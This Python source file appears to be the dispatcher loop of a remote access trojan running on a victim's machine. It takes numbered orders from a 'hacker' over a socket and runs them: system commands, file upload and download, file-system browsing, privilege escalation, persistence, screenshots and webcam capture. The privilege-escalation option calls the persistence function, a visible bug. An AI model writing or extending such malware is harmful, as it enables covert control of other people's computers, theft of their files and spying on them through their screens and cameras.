from core.features.command import *
from core.features.transfer_files import *
from core.features.privilage import *
from core.features.persistance import *
from core.features.monitoring import *


def handleConnection(my_socket):
    print("[+] Handling Connection")
    keep_alive = True
    while keep_alive:
        user_option = my_socket.receive_data()
        print("[+] hacker selected option = ", user_option)
        if user_option == "1":
            print("\t\t[+] Executing System Commands")
            run_command_advanced(my_socket)
        elif user_option == "2":
            print("\t\t[+] Downloading Files from hacker")
            download_files(my_socket)

        elif user_option == "3":
            print("\t\t[+] Uploading Files to hacker")
            upload_files(my_socket)

        elif user_option == "4":
            print("\t\t[+] Navigate File system")
            my_socket.change_dir()
        elif user_option == "5":
            print("\t\t[+] Privilage escalation")
            become_persistant(my_socket)
        elif user_option == "6":
            print("\t\t[+] Becoming Persistant")
            become_persistant(my_socket)

        elif user_option == "7":
            print("\t\t Taking Screenshot")
            capture_screenshot(my_socket)
        elif user_option=="8":
            print("\t\t[+] Capturing webcam")
            capturing_webcam(my_socket)
        elif user_option == "99":
            print("\t\t[-] Exiting the main loop")
            keep_alive = False
        else:
            print("\t\t[-] Invalid input, try again")